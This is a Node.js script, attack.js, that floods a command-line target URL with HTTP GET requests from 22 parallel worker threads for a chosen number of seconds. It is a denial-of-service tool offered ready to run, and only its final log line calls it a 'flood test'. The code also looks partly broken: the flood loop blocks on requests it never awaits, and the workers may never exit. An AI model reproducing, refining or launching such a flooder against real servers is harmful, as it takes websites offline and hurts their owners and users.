// attack.js
const axios = require('axios');
const { Worker, isMainThread, parentPort } = require('worker_threads');

// Function to send HTTP requests
const sendRequest = async (targetUrl) => {
  try {
    const response = await axios.get(targetUrl);
    // Uncomment below if you want to see request status
    // console.log(`Request sent: Status ${response.status}`);
  } catch (error) {
    // Uncomment below if you want to see errors
    // console.error(`Request failed: ${error.message}`);
  }
};

// Function to start flooding (each worker will call this function)
const flood = (targetUrl, duration) => {
  const endTime = Date.now() + duration;
  while (Date.now() < endTime) {
    sendRequest(targetUrl);
  }
};

// Main thread
if (isMainThread) {
  const [,, targetUrl, timeInSeconds] = process.argv;

  if (!targetUrl || !timeInSeconds) {
    console.log('Usage: node attack.js <target_url> <time_in_seconds>');
    process.exit(1);
  }

  const durationInMs = parseInt(timeInSeconds, 10) * 1000;
  if (isNaN(durationInMs) || durationInMs <= 0) {
    console.log('Please provide a valid time in seconds.');
    process.exit(1);
  }

  // Create 22 worker threads (adjust as needed)
  const numThreads = 22;
  let workers = [];
  for (let i = 0; i < numThreads; i++) {
    workers.push(new Worker(__filename));
  }

  // Send the workers to perform the flood
  workers.forEach(worker => {
    worker.postMessage({ targetUrl, duration: durationInMs });
  });

  // When all workers complete, exit
  Promise.all(workers.map(worker => new Promise(resolve => worker.on('exit', resolve))))
    .then(() => {
      console.log('Flood test completed.');
      process.exit(0);
    });
} else {
  // Worker thread: perform flooding
  parentPort.on('message', ({ targetUrl, duration }) => {
    flood(targetUrl, duration);
  });
}
